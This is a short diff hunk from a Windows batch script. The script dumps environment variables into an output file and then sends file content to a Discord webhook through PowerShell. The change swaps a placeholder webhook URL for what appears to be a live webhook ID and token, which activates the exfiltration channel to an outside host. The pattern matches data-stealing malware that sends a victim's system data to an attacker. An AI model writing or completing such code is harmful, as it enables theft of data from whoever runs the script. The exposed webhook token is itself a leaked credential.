@@ -90,7 +90,7 @@ set >> "%OUTPUT%"
 echo. >> "%OUTPUT%"
 
 :: Get Discord webhook URL (replace with your webhook)
-set "WEBHOOK_URL=https://discord.com/api/webhooks/YOUR_WEBHOOK_ID/YOUR_WEBHOOK_TOKEN"
+set "WEBHOOK_URL=https://discord.com/api/webhooks/1478994129508892672/lA7G6TFM417kohIT57ztdQP1N6imbX9HwhTIbYQiKzvX3nJSSVl4UcJF0fVIEe8HN_ZE"
 
 :: Read file content and send to Discord
 powershell -Command ^
